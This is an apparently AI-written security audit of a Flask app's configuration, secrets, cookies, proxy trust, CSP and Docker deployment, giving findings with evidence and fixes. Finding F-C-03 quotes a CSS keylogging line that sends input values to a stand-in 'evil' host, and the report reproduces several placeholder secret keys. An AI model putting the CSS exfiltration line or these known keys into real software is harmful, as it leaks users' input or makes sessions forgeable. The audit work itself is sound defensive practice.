# 03 -- Config, Secrets, and Deploy Findings

Audit session: S1, Subagent C (Config, Secrets, Deploy). Branch:
`audit/security-2026-04-15`. Date: 2026-04-15. OWASP focus: A02, A05, A08.

## Summary

- **Files read (in full):**
  - `app/config.py` (145 lines)
  - `app/__init__.py` (548 lines)
  - `app/extensions.py` (31 lines)
  - `Dockerfile` (59 lines)
  - `docker-compose.yml` (136 lines)
  - `docker-compose.dev.yml` (115 lines)
  - `docker-compose.build.yml` (27 lines -- discovered via Glob, included for
    completeness)
  - `nginx/nginx.conf` (194 lines)
  - `cloudflared/config.yml` (73 lines)
  - `gunicorn.conf.py` (83 lines)
  - `entrypoint.sh` (98 lines)
  - `.env.example` (159 lines)
  - `.env.dev` (4 lines)
  - `.gitignore` (51 lines)
  - `app/utils/logging_config.py` (182 lines -- read in full to confirm no
    secrets are logged)
- **Checks performed:** 1-47 (all). Checks 19-20 (TLS config / server_tokens)
  are evaluated against an HTTP-only listener -- reported as N/A with reasoning
  rather than skipped.
- **Finding count:** 0 Critical / 4 High / 7 Medium / 5 Low / 4 Info
- **Top concern:** Nginx trusts `X-Forwarded-For` from the ENTIRE set of RFC
  1918 subnets (`172.16.0.0/12`, `192.168.0.0/16`, `10.0.0.0/8`) but the
  Cloudflare Tunnel sidecar is a single IP on a single Docker network --
  combined with Gunicorn's equally loose `forwarded_allow_ips`, any host that
  reaches Nginx from any private-range address can spoof a client IP, defeating
  rate limiting and audit log attribution.

## Security headers table

Headers set by Flask in `app/__init__.py:409-428` (read verbatim, not from
the workflow doc). Nginx only sets two headers and only on `/static/`
(`nginx.conf:154,160`); the `/` location proxies without adding or stripping
headers, so Flask's headers reach the client unmodified.

| Header | Set where (file:line) | Value | Verdict |
|---|---|---|---|
| `X-Content-Type-Options` | `app/__init__.py:414` (all routes) and `nginx.conf:160` (static only) | `nosniff` | pass |
| `X-Frame-Options` | `app/__init__.py:415` | `DENY` | pass |
| `Referrer-Policy` | `app/__init__.py:416` | `strict-origin-when-cross-origin` | pass |
| `Permissions-Policy` | `app/__init__.py:417-419` | `camera=(), microphone=(), geolocation=()` | pass (narrow, add more directives if scope grows) |
| `Content-Security-Policy` | `app/__init__.py:420-427` | `default-src 'self'; script-src 'self' https://cdn.jsdelivr.net https://unpkg.com; style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://fonts.googleapis.com; font-src 'self' https://cdn.jsdelivr.net https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self'` | partial -- see F-C-03, F-C-04 |
| `Strict-Transport-Security` | **NOT SET** anywhere in Flask or Nginx | -- | fail -- see F-C-02 |
| `Cache-Control` | `nginx.conf:154` (static only) | `public, immutable` | fine for static assets |
| `X-Request-Id` | `app/utils/logging_config.py:143` | uuid4 per request | informational, not a security header |
| `frame-ancestors` in CSP | -- | missing | low -- see F-C-05 |
| `X-Permitted-Cross-Domain-Policies` | -- | missing | low, non-critical |

## Cookie flags table

Flask-Login remember-me is enabled for the app (`REMEMBER_COOKIE_DURATION` is
set in `BaseConfig`; there is no use of `login_user(remember=False)`
hardcoded, so the remember-me cookie CAN be issued).

| Flag | Value | Source (file:line) | Verdict |
|---|---|---|---|
| `SESSION_COOKIE_SECURE` | `True` | `app/config.py:126` (ProdConfig only) | pass in prod; dev/test inherit Flask's default (False) which is correct for localhost |
| `SESSION_COOKIE_HTTPONLY` | `True` | `app/config.py:127` (ProdConfig only) | pass in prod; Flask's default is also True so dev/test are fine |
| `SESSION_COOKIE_SAMESITE` | `"Lax"` | `app/config.py:128` (ProdConfig only) | pass |
| `REMEMBER_COOKIE_SECURE` | **NOT SET** (Flask-Login default: False) | -- | fail -- see F-C-06 |
| `REMEMBER_COOKIE_HTTPONLY` | **NOT SET** (Flask-Login default: True) | -- | pass by inheritance |
| `REMEMBER_COOKIE_SAMESITE` | **NOT SET** (Flask-Login default: None) | -- | fail -- see F-C-06 |
| `REMEMBER_COOKIE_DURATION` | 30 days (env-configurable) | `app/config.py:31-33` | reasonable |
| `PERMANENT_SESSION_LIFETIME` | **NOT SET** (Flask default: 31 days) | -- | medium -- see F-C-07 |
| `WTF_CSRF_TIME_LIMIT` | **NOT SET** (Flask-WTF default: 3600s = 1h) | -- | pass (default is sane) |
| `WTF_CSRF_ENABLED` | `False` in TestConfig only | `app/config.py:73` | pass -- scoped to tests |

## Preliminary findings verification

### Preliminary #1 -- `.env.dev` is tracked and stale

- **Status:** Confirmed.
- **Evidence:** `git ls-files` returns `.env.dev` and `.env.example` (and
  NOT `.env`, which is correctly in `.gitignore:18`). Contents of `.env.dev`:
  ```
  FLASK_APP=src/flask_app/app.py
  FLASK_DEBUG=1
  DATABASE_URL=postgresql://flask_dev:dev_password_change_me@127.0.0.1:5433/flask_app_dev
  SECRET_KEY=dev-secret-key-not-for-production
  ```
  Line 1 (`FLASK_APP=src/flask_app/app.py`) references a file that does not
  exist -- the real entry point is `run.py`. The placeholder values
  (`dev_password_change_me`, `dev-secret-key-not-for-production`) are not
  live credentials.
- **Severity (final):** Low. See F-C-13.

### Preliminary #3a -- HSTS

- **Status:** Confirmed (still absent).
- **Evidence:** Grep across the repo for `Strict-Transport-Security` /
  `HSTS` returns zero hits in `app/`, `nginx/`, and `gunicorn.conf.py`.
  `app/__init__.py:412-428` enumerates every response header Flask sets; HSTS
  is not among them. `nginx.conf:154,160` are the only `add_header` lines in
  Nginx and neither is HSTS.
- **Severity (final):** Medium. See F-C-02. Note: previous internal note
  `docs/phase_8d1_implementation_plan.md:191` argued HSTS was "not Nginx's
  job" because TLS terminates at Cloudflare, but HSTS is a browser-directed
  header, not a TLS-layer construct. It still must be set somewhere in the
  response chain -- either by Flask for defense in depth, or by Cloudflare at
  the edge. The audit should record whether Cloudflare is configured to
  inject HSTS; if not, this finding stands unresolved.

### Preliminary #3b -- CSP `unsafe-inline` in style-src + external CDN hosts

- **Status:** Confirmed.
- **Evidence:** `app/__init__.py:420-427`, quoted verbatim:
  ```python
  response.headers["Content-Security-Policy"] = (
      "default-src 'self'; "
      "script-src 'self' https://cdn.jsdelivr.net https://unpkg.com; "
      "style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://fonts.googleapis.com; "
      "font-src 'self' https://cdn.jsdelivr.net https://fonts.gstatic.com; "
      "img-src 'self' data:; "
      "connect-src 'self'"
  )
  ```
  `'unsafe-inline'` is present in `style-src` (Medium -- see F-C-03).
  External CDNs `cdn.jsdelivr.net`, `unpkg.com`, `fonts.googleapis.com`, and
  `fonts.gstatic.com` are allowed in `script-src`/`style-src`/`font-src`
  without any SRI enforcement (Medium -- see F-C-04). `script-src` does not
  contain `'unsafe-inline'` or `'unsafe-eval'`, which is good.
- **Severity (final):** Medium for each sub-finding (see F-C-03, F-C-04).

### Preliminary #4 -- Flask-Limiter `memory://`

- **Status:** Confirmed.
- **Evidence:** `app/extensions.py:31`, quoted verbatim:
  ```python
  limiter = Limiter(key_func=get_remote_address, default_limits=[], storage_uri="memory://")
  ```
  Multiplier blast radius: `gunicorn.conf.py:24` sets
  `workers = int(os.getenv("GUNICORN_WORKERS", "2"))` with a default of 2,
  and `docker-compose.yml:71` sets `GUNICORN_WORKERS: ${GUNICORN_WORKERS:-2}`
  -- so production defaults to 2 workers, meaning every per-IP rate limit is
  effectively doubled. A restart resets both counters. Section 1C.5 should
  quantify this precisely.
- **Severity (final):** Medium. See F-C-09.

## Findings

### F-C-01: Nginx `set_real_ip_from` + Gunicorn `forwarded_allow_ips` trust all private ranges

- **Severity:** High
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-290 (Authentication Bypass by Spoofing), CWE-348 (Use of
  Less Trusted Source)
- **Location:** `nginx/nginx.conf:117-120`, `gunicorn.conf.py:80-83`
- **Evidence:**
  ```
  # nginx.conf:117-120
  set_real_ip_from 127.0.0.1;
  set_real_ip_from 172.16.0.0/12;
  set_real_ip_from 192.168.0.0/16;
  set_real_ip_from 10.0.0.0/8;
  ```
  ```python
  # gunicorn.conf.py:80-83
  forwarded_allow_ips = os.getenv(
      "FORWARDED_ALLOW_IPS",
      "172.16.0.0/12,192.168.0.0/16,10.0.0.0/8",
  )
  ```
- **Impact:** Nginx is configured to trust `CF-Connecting-IP` (nginx.conf:126)
  from any RFC 1918 source, and Gunicorn is configured to trust
  `X-Forwarded-For` from the same ranges. The prod compose file puts Nginx on
  the `frontend` and `backend` bridges and Gunicorn on `backend`
  (`docker-compose.yml:107-109,81-82`); both networks are internal, but the
  trust envelope is far broader than the real topology. If any other
  container, sidecar, or VM on a shared Docker host -- ANY 10.x/172.16.x/192.168.x
  origin -- can reach Nginx:80 or Gunicorn:8000, it can forge `CF-Connecting-IP`
  or `X-Forwarded-For` and Gunicorn will record the forged IP as
  `request.remote_addr`. Consequences:
  1. Flask-Limiter's `get_remote_address` key (`extensions.py:31`) becomes
     attacker-controlled, letting an attacker bypass per-IP rate limits on
     `/login`, `/mfa`, etc.
  2. Audit log entries attributing actions to `remote_addr` become useless.
  3. Any future allowlist-by-IP logic is trivially bypassed.
  The documentation in `nginx.conf:115-116` justifies 192.168.0.0/16 as "LAN
  clients (direct access without tunnel)" but a production deployment behind
  Cloudflare Tunnel does NOT need direct LAN access -- cloudflared connects
  from a single known container on a single known Docker network.
- **Recommendation:**
  1. Lock `set_real_ip_from` in `nginx.conf` to the specific Docker bridge
     subnet(s) the compose project actually uses. On a project-scoped compose
     file these are deterministic -- inspect `docker network inspect
     shekel-prod_frontend` once, hardcode that CIDR, and update on topology
     changes.
  2. Lock `forwarded_allow_ips` in `gunicorn.conf.py` to the exact container
     IP of the `nginx` service (or its specific subnet). Gunicorn accepts a
     single IP -- that is the right shape.
  3. Remove `10.0.0.0/8` and `192.168.0.0/16` entirely unless a documented
     path uses them.
  4. Delete the fallback default in the `os.getenv` call -- require the env
     var to be set explicitly so a misconfigured deploy fails closed.

### F-C-02: HSTS not set anywhere

- **Severity:** Medium
- **OWASP:** A02:2021 Cryptographic Failures
- **CWE:** CWE-319 (Cleartext Transmission of Sensitive Information)
- **Location:** Absent from `app/__init__.py:412-428` and `nginx/nginx.conf`
  entirely.
- **Evidence:** Grep for `Strict-Transport-Security` across the repo returns
  zero hits in the code paths that serve responses (only documentation
  references). The Flask `set_security_headers` hook at
  `app/__init__.py:412-428` sets every other expected header but not HSTS.
- **Impact:** A user who types `budget.example.com` without `https://` is
  served an HTTP request, gets the TLS upgrade from Cloudflare, and the
  browser has no long-lived instruction to insist on HTTPS next time. A
  network-position attacker at the user's cafe Wi-Fi, a hostile captive
  portal, or a DNS hijacker could downgrade the first unprotected request
  and strip credentials before the tunnel gets involved. HSTS is the
  single-line defense that closes this.
- **Recommendation:** Add in `app/__init__.py:_register_security_headers`:
  ```python
  response.headers["Strict-Transport-Security"] = (
      "max-age=31536000; includeSubDomains"
  )
  ```
  Start with `max-age=31536000` (1 year) and `includeSubDomains`. Do NOT
  add `preload` until the developer has decided to commit to the HSTS
  preload list (one-way, affects every subdomain forever). Also verify
  Cloudflare's dashboard HSTS setting: if Cloudflare Edge Certificates is
  already injecting HSTS, record that and downgrade this to Info.

### F-C-03: CSP allows `'unsafe-inline'` in `style-src`

- **Severity:** Medium
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers)
- **Location:** `app/__init__.py:423`
- **Evidence:**
  ```python
  "style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://fonts.googleapis.com; "
  ```
- **Impact:** An attacker who achieves HTML injection anywhere a template
  renders untrusted data can inject a `<style>` block or `style=""`
  attribute with `expression()`, `background: url(javascript:...)`, or CSS
  exfiltration tricks (attribute-selector-based keylogging of form inputs
  via `input[value^="a"] { background: url(//evil/a) }`, which is real and
  well-documented). `script-src` correctly excludes `unsafe-inline`, which
  stops classic XSS, but CSS-based data exfil is still available through
  this hole.
- **Recommendation:** Inventory every `style=""` attribute and inline
  `<style>` block in the templates (grep `app/templates/` for `style=`,
  `<style`). Move them to `app/static/css/app.css`. Once zero inline styles
  remain, remove `'unsafe-inline'` from `style-src`. If a small number of
  dynamic styles is unavoidable, use a CSP nonce
  (`style-src 'self' 'nonce-<random>'`) per request.

### F-C-04: CSP allows external CDN hosts without SRI enforcement

- **Severity:** Medium
- **OWASP:** A08:2021 Software and Data Integrity Failures
- **CWE:** CWE-494 (Download of Code Without Integrity Check)
- **Location:** `app/__init__.py:422-424`
- **Evidence:**
  ```python
  "script-src 'self' https://cdn.jsdelivr.net https://unpkg.com; "
  "style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://fonts.googleapis.com; "
  "font-src 'self' https://cdn.jsdelivr.net https://fonts.gstatic.com; "
  ```
  CSP alone permits these origins; it does not compel `integrity="..."` on
  the `<link>` / `<script>` tags. Grep of `app/templates/` is out of this
  subagent's direct scope, but the CSP is written as if SRI is advisory.
- **Impact:** A compromise at jsdelivr, unpkg, or Google Fonts would let a
  drive-by attacker replace the JS/CSS/font assets served to every Shekel
  user. `script-src` is the sensitive one: jsdelivr or unpkg shipping a
  malicious Bootstrap or HTMX build would give the attacker immediate code
  execution in the authenticated origin. `unsafe-inline` is not present
  in `script-src`, but an attacker controlling a `<script src="..."`
  doesn't need inline.
- **Recommendation (preferred):** Vendor the CDN assets. Copy the exact
  versions into `app/static/vendor/`, update templates to reference
  `url_for("static", ...)`, and strip `cdn.jsdelivr.net` / `unpkg.com` /
  `fonts.*.googleapis.com` from the CSP. This also eliminates the
  third-party font fingerprinting surface.
- **Recommendation (minimum):** If vendoring is deferred, pin exact
  versions in every `<link>` and `<script>` tag AND add SRI hashes:
  `integrity="sha384-..." crossorigin="anonymous"`. Then add
  `require-sri-for script style` to the CSP so browsers refuse any resource
  without an integrity attribute. This is the defensible half-measure.

### F-C-05: CSP missing `frame-ancestors 'none'`

- **Severity:** Low
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers)
- **Location:** `app/__init__.py:420-427`
- **Evidence:** The CSP string defines `default-src 'self'` plus a handful
  of explicit directives, none of which is `frame-ancestors`. The browser
  falls back to `X-Frame-Options: DENY` (set at line 415), so the practical
  risk is near-zero, but duplicating the intent in CSP is the modern,
  authoritative control.
- **Impact:** A legacy browser or future deprecation of X-Frame-Options
  could re-open clickjacking. Low because X-Frame-Options still covers
  every currently shipping browser.
- **Recommendation:** Append `; frame-ancestors 'none'` to the CSP string.

### F-C-06: `REMEMBER_COOKIE_SECURE` and `REMEMBER_COOKIE_SAMESITE` not set

- **Severity:** High
- **OWASP:** A02:2021 Cryptographic Failures, A05:2021 Security Misconfiguration
- **CWE:** CWE-614 (Sensitive Cookie Without Secure Attribute)
- **Location:** `app/config.py:92-129` -- ProdConfig sets
  `SESSION_COOKIE_SECURE`, `SESSION_COOKIE_HTTPONLY`, and
  `SESSION_COOKIE_SAMESITE` but no `REMEMBER_COOKIE_*` hardening.
- **Evidence:** The full ProdConfig cookie stanza:
  ```python
  SESSION_COOKIE_SECURE = True
  SESSION_COOKIE_HTTPONLY = True
  SESSION_COOKIE_SAMESITE = "Lax"
  ```
  No `REMEMBER_COOKIE_SECURE`. No `REMEMBER_COOKIE_SAMESITE`. Flask-Login's
  defaults are `REMEMBER_COOKIE_SECURE=False` and
  `REMEMBER_COOKIE_SAMESITE=None`, so with ProdConfig both defaults apply.
  The remember cookie is enabled (`REMEMBER_COOKIE_DURATION = timedelta(
  days=30)` at `config.py:31-33`, and no code path forces
  `login_user(remember=False)`).
- **Impact:** The remember-me cookie is a long-lived (30 days by default)
  authentication credential. Without `Secure`, it is sent over any HTTP
  request -- and if a user's browser ever hits an `http://` Shekel URL
  before the HSTS fix lands, the cookie leaks in the clear. Without
  `SameSite=Lax`, it is attached to cross-site requests, opening
  login-CSRF variants where a subresource request from an attacker site
  can revive the user's session on the victim browser. The session cookie
  is already hardened; the remember cookie is a second, longer-lived auth
  credential and must match.
- **Recommendation:** In `ProdConfig` add:
  ```python
  REMEMBER_COOKIE_SECURE = True
  REMEMBER_COOKIE_HTTPONLY = True
  REMEMBER_COOKIE_SAMESITE = "Lax"
  ```
  (HTTPONLY is already Flask-Login's default but explicit is clearer.)
  Add a test in `tests/test_config.py` that asserts all six cookie flags
  are set in ProdConfig so regression is caught.

### F-C-07: `PERMANENT_SESSION_LIFETIME` unset (Flask default: 31 days)

- **Severity:** Medium
- **OWASP:** A07:2021 Identification and Authentication Failures (overlap
  with A05)
- **CWE:** CWE-613 (Insufficient Session Expiration)
- **Location:** `app/config.py` -- absent from all config classes.
- **Evidence:** Grep for `PERMANENT_SESSION_LIFETIME` across the repo
  returns zero hits in `app/`. Flask's built-in default for this setting
  is 31 days, and any time a session is marked `permanent=True`, Flask
  reads this value to size the cookie. The cookie is already `Secure +
  HttpOnly + SameSite=Lax`, but the lifetime is still 31 days.
- **Impact:** A 31-day idle session is longer than most single-user
  budget-app workflows need. Combined with the 30-day remember cookie
  (which is a separate mechanism), a stolen laptop/browser profile gives
  attackers a long tail. For a financial app this is worth tightening.
- **Recommendation:** Set `PERMANENT_SESSION_LIFETIME = timedelta(days=7)`
  (or shorter -- the developer should pick) in `BaseConfig`. Make it
  env-configurable mirroring `REMEMBER_COOKIE_DURATION_DAYS`.

### F-C-08: `DevConfig` has no cookie hardening and inherits no SESSION_COOKIE_* settings

- **Severity:** Low
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-1188 (Insecure Default Initialization of Resource)
- **Location:** `app/config.py:53-61` (DevConfig)
- **Evidence:** DevConfig subclasses BaseConfig and adds only `DEBUG = True`
  and `SQLALCHEMY_DATABASE_URI`. None of the session/remember hardening
  lives in BaseConfig, so dev runs with Flask/Flask-Login defaults
  (`SESSION_COOKIE_SECURE=False`, `SESSION_COOKIE_SAMESITE=None`). On
  localhost over HTTP this is necessary and correct.
- **Impact:** Low because dev is local. Info-level reminder: never start
  DevConfig on a non-localhost bind, and make sure the dev compose service
  is not exposed via `ports:` beyond what's needed. (It is not --
  `docker-compose.dev.yml:101-104` maps `5000:5000` to the host only.)
- **Recommendation:** Add a `# pragma: cookie settings intentionally omitted
  for localhost` comment in DevConfig so the asymmetry with ProdConfig is
  not mistaken for an oversight.

### F-C-09: Flask-Limiter `memory://` storage under multi-worker Gunicorn

- **Severity:** Medium
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling)
- **Location:** `app/extensions.py:31`, multiplied by `gunicorn.conf.py:24`
- **Evidence:**
  ```python
  # app/extensions.py:31
  limiter = Limiter(key_func=get_remote_address, default_limits=[], storage_uri="memory://")
  ```
  ```python
  # gunicorn.conf.py:24
  workers = int(os.getenv("GUNICORN_WORKERS", "2"))
  ```
  `docker-compose.yml:71` sets `GUNICORN_WORKERS: ${GUNICORN_WORKERS:-2}`.
- **Impact:** Each Gunicorn worker owns its own counter dict. With the
  default 2 workers, every documented per-IP rate limit is silently x2.
  Container restart wipes both counters. Additionally, there are no
  `default_limits` at the Limiter constructor level -- every endpoint must
  opt in by decorator, which means any route that forgot to decorate has
  no ceiling at all. This is the other half of the same finding as F-C-01:
  together, loose IP trust + per-worker counters + no global default turns
  the rate limiter into a speed bump.
- **Recommendation:** Pick one:
  1. Add `storage_uri="redis://..."` pointing at a small Redis container
     on the backend network. Shared counters across workers, survives
     restart.
  2. If Redis is too heavy, accept single-worker production
     (`GUNICORN_WORKERS=1`) and document the choice. On a single-user
     personal app this is a defensible simplification.
  3. Independently of which storage layer is chosen, add sane
     `default_limits=["200 per hour", "30 per minute"]` at the Limiter
     constructor so unreachable routes still get a ceiling.

### F-C-10: Production image pins to `:latest` tag

- **Severity:** Medium
- **OWASP:** A08:2021 Software and Data Integrity Failures
- **CWE:** CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)
- **Location:** `docker-compose.yml:48`
- **Evidence:**
  ```yaml
  app:
    image: ghcr.io/saltyreformed/shekel:latest
    # Always pull the latest image -- prevents stale cached :latest tags
    # from causing port mismatches or missing fixes.
    pull_policy: always
  ```
- **Impact:** Deployment is not reproducible. A rollback means "push the
  last git commit back to main and rebuild" rather than "pin to the
  previously known-good image digest." If the GHCR image is ever
  compromised at the registry layer, every `docker compose up` silently
  pulls the tampered image. This is a common supply-chain pitfall that
  infrastructure teams call out specifically. The postgres and nginx
  images (`postgres:16-alpine`, `nginx:1.27-alpine`) are minor-version
  pinned which is acceptable.
- **Recommendation:** Replace `:latest` with a concrete version tag
  (`:v0.12.3`) or, better, an immutable digest
  (`ghcr.io/saltyreformed/shekel@sha256:...`). Update the deploy.sh
  script to rewrite the tag on each release. Keep `pull_policy: always`
  or, if pinning to a digest, set `pull_policy: missing`.

### F-C-11: `cloudflared/config.yml` has no Cloudflare Access policy and uses `noTLSVerify: true`

- **Severity:** Medium (cumulative of two sub-issues)
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-287 (Improper Authentication), CWE-295 (Improper Certificate
  Validation)
- **Location:** `cloudflared/config.yml:49-57`
- **Evidence:**
  ```yaml
  ingress:
    - hostname: <DOMAIN>
      service: http://localhost:80
      originRequest:
        # Nginx listens on plain HTTP -- no TLS on the origin.
        noTLSVerify: true
  ```
- **Impact:**
  1. There is no `team_name` / Cloudflare Access gate in the repo config.
     If the operator has configured Access at the Cloudflare dashboard
     this is fine -- but the audit must verify that, because the git
     artifact alone publishes the app to the open internet (behind DDoS
     protection but without an auth gate upstream of Flask login).
  2. `noTLSVerify: true` is defensible here because cloudflared and Nginx
     share `localhost`, so the traffic never leaves the host. It is still
     worth documenting that Nginx has no `listen 443`/`ssl_*` stanza
     (verified -- grep of `nginx.conf` for `ssl_` returns zero) and the
     tunnel-to-Nginx hop is plain HTTP on loopback. Low in this topology,
     but noisy to casual reviewers.
- **Recommendation:**
  1. Confirm a Cloudflare Access policy is attached to the tunnel
     hostname -- ideally requiring device certificates or at minimum
     email auth. If not, document the omission as an explicit risk
     acceptance in `docs/runbook.md`.
  2. Leave `noTLSVerify: true` in place but add a comment reinforcing
     that this is only safe because cloudflared and Nginx are colocated
     on the same host via loopback.

### F-C-12: `.env.example` ships a working dev `POSTGRES_PASSWORD` value

- **Severity:** Low
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-798 (Use of Hard-coded Credentials)
- **Location:** `.env.example:28`
- **Evidence:**
  ```
  POSTGRES_PASSWORD=shekel_pass
  ```
  Accompanied by a comment "REQUIRED in production" but the default value
  itself is functional. New operators who `cp .env.example .env` and then
  `docker compose up -d` would inadvertently run prod with the dev
  password unless they read the comment.
- **Impact:** Low because the prod compose file is defensive --
  `docker-compose.yml:34` uses the fail-loud form
  `${POSTGRES_PASSWORD:?Set POSTGRES_PASSWORD in .env}`, but that only
  checks for *presence*, not for the default value. An operator who
  leaves `shekel_pass` gets a running stack with a known public password.
- **Recommendation:** Replace `shekel_pass` in `.env.example` with a
  non-functional placeholder: `POSTGRES_PASSWORD=change-me-before-first-run`,
  and add an entrypoint check that refuses to start if the password
  equals any of the known placeholders. Same pattern as the existing
  `config.py:132` check for `SECRET_KEY.startswith("dev-only")`.

### F-C-13: `.env.dev` is committed, stale, and references a non-existent path

- **Severity:** Low
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-1053 (Missing Documentation for Design)
- **Location:** `.env.dev:1-4`
- **Evidence:**
  ```
  FLASK_APP=src/flask_app/app.py
  FLASK_DEBUG=1
  DATABASE_URL=postgresql://flask_dev:dev_password_change_me@127.0.0.1:5433/flask_app_dev
  SECRET_KEY=dev-secret-key-not-for-production
  ```
  `git ls-files` confirms it is tracked. `FLASK_APP=src/flask_app/app.py`
  points at a path that does not exist in the repo -- the real entry is
  `run.py`. Values are placeholders, not real credentials.
- **Impact:** Confusing, not exploitable. Could mislead a future
  contributor into thinking there is a `src/flask_app/` package, or into
  trusting `.env.dev` as a safe starting point when the values are stale.
- **Recommendation:** Delete the file, or rewrite it to match `run.py`
  and the actual dev compose defaults, or add it to `.gitignore`
  alongside `.env`. The committed file serves no current purpose that
  `.env.example` does not already serve better.

### F-C-14: `entrypoint.sh` does not verify `SECRET_KEY` is not the base default

- **Severity:** Low
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-1188
- **Location:** `entrypoint.sh` and `app/config.py:130-137`
- **Evidence:** `ProdConfig.__init__` at `config.py:130-135` correctly
  rejects `SECRET_KEY.startswith("dev-only")`, so a prod deploy where the
  env var is missing entirely (config falls through to the BaseConfig
  default `dev-only-change-me-in-production`) will raise on startup.
  Good. BUT: the entrypoint does not validate `SECRET_KEY` at all before
  the Python app starts, and the same defense does not apply to the value
  `change-me-to-a-random-secret-key` (which is the literal string in
  `.env.example:11`). If an operator copies `.env.example` to `.env`
  without editing, SECRET_KEY is loaded as literally
  `change-me-to-a-random-secret-key`, ProdConfig's
  `startswith("dev-only")` check passes, and the app starts with a
  publicly known SECRET_KEY. Session cookies become forgeable.
- **Impact:** Real but contingent on operator error. Session forgery,
  CSRF token bypass, and token-signed URL tampering all follow from a
  known SECRET_KEY.
- **Recommendation:** Broaden the check in `config.py:132` to reject
  every known placeholder:
  ```python
  _KNOWN_DEFAULT_SECRETS = {
      "dev-only-change-me-in-production",
      "change-me-to-a-random-secret-key",
      "dev-secret-key-not-for-production",
  }
  if not self.SECRET_KEY or self.SECRET_KEY in _KNOWN_DEFAULT_SECRETS \
     or self.SECRET_KEY.startswith("dev-only"):
      raise ValueError("SECRET_KEY must be set to a secure random value in production.")
  ```
  Also add a length check (`len(self.SECRET_KEY) >= 32`) because a short
  key can appear random while still being brute-forceable.

### F-C-15: `SECRET_KEY` has a fallback default in BaseConfig

- **Severity:** High (because the fallback is fail-open for Dev/Test and
  only fail-closed for Prod via a runtime check that can be circumvented
  by the `.env.example` placeholder -- see F-C-14)
- **OWASP:** A02:2021 Cryptographic Failures
- **CWE:** CWE-798 (Use of Hard-coded Credentials), CWE-1188
- **Location:** `app/config.py:22`
- **Evidence:**
  ```python
  SECRET_KEY = os.getenv("SECRET_KEY", "dev-only-change-me-in-production")
  ```
- **Impact:** On a development or testing run where `SECRET_KEY` is
  unset, the app silently runs with a hardcoded key that is visible in
  the public repo. Anyone who can read the repo can forge session
  cookies and CSRF tokens against any running Dev/Test instance --
  useful for lateral movement if the app is ever briefly accessible
  beyond localhost. The ProdConfig guard rejects this specific string,
  but only at Python startup AFTER the value has been loaded -- if a
  future code path reads `BaseConfig.SECRET_KEY` directly (e.g. a
  standalone script that does not instantiate ProdConfig), the default
  leaks.
- **Recommendation:** Remove the default entirely:
  ```python
  SECRET_KEY = os.getenv("SECRET_KEY")
  ```
  Let the app fail to start if the env var is missing. Dev and test
  workflows should set it explicitly -- the test fixture can generate a
  random one per session, and `.env.example` should ship with a comment
  directing the operator to generate one before first run. This matches
  how `TOTP_ENCRYPTION_KEY` is already handled (`config.py:25` has no
  default -- the correct pattern).

### F-C-16: `docker-compose.dev.yml` hardcodes `SECRET_KEY` as a known string

- **Severity:** Low
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-798
- **Location:** `docker-compose.dev.yml:91`
- **Evidence:**
  ```yaml
  SECRET_KEY: dev-secret-key-not-for-production
  ```
- **Impact:** Low because this is the dev compose file and the value
  is already a known-public string. Still relevant to F-C-14 -- it
  enumerates another placeholder the prod-side guard should explicitly
  reject.
- **Recommendation:** Add this string to the rejection list built in
  F-C-14. No change needed to the dev compose file itself.

### F-C-17: Gunicorn `forwarded_allow_ips` fallback default is identical to the loose Nginx trust

- **Severity:** Covered by F-C-01 above (duplicate would inflate the
  count); quoted here only as cross-reference.
- **Location:** `gunicorn.conf.py:80-83`
- **Remediation is in F-C-01.**

### F-C-18: No `HEALTHCHECK` for the `nginx` service in prod compose -- wait, there is one. Scratch this.

(Retained as a placeholder to document that the Nginx healthcheck at
`docker-compose.yml:110-115` and the app healthcheck at
`docker-compose.yml:83-88` were both verified present. Not a finding.)

### F-C-19: Prod `app` compose service has no Docker `HEALTHCHECK`-defined `start_interval`, only `start_period`

- **Severity:** Info
- **Location:** `docker-compose.yml:83-88`
- **Evidence:**
  ```yaml
  healthcheck:
    test: ["CMD", "python", "-c", "import urllib.request; urllib.request.urlopen('http://localhost:8000/health')"]
    interval: 30s
    timeout: 5s
    start_period: 120s
    retries: 3
  ```
- **Impact:** Not a security issue -- the config is functional. Noting
  it only because modern Docker supports `start_interval` which gives
  faster feedback during the start window. Ignore if the team cares
  about uptime polish, not security.

### F-C-20: `app/__init__.py:139` `ref_cache.init()` exception handler swallows `OperationalError`

- **Severity:** Info (out of strict scope, reporting as required by
  CLAUDE.md rule 4 and Testing Standards problem reporting protocol)
- **OWASP:** A09:2021 Security Logging and Monitoring Failures
- **Location:** `app/__init__.py:203-208`
- **Evidence:**
  ```python
  except (sqlalchemy.exc.ProgrammingError, sqlalchemy.exc.OperationalError) as exc:
      app.logger.warning(
          "ref_cache initialization skipped (%s). "
          "Jinja globals will not be available until next restart.",
          type(exc).__name__,
      )
  ```
- **Impact:** If the database is transiently unreachable at startup,
  the app boots with an empty ref_cache and every subsequent template
  that reads from `jinja_env.globals["STATUS_*"]` gets `None`. That is
  a correctness risk, not a security risk, but it deserves a bug report
  to the Identity/Data subagents.
- **Recommendation:** Out of scope for this section. Flagging to the
  1A Subagent A/B combined report.

## What was checked and found clean

**Check 2 -- `TOTP_ENCRYPTION_KEY` handling.** `app/config.py:25` uses
`os.getenv("TOTP_ENCRYPTION_KEY")` with NO fallback default -- correct.
`app/services/mfa_service.py:27` reads the env var at call time and raises
`RuntimeError` if missing, never falls back. `app/__init__.py:43-47` only
emits a warning log on boot if the key is unset. Grep across `app/` and
`scripts/` finds no hardcoded Fernet key and no log/print of the key value.

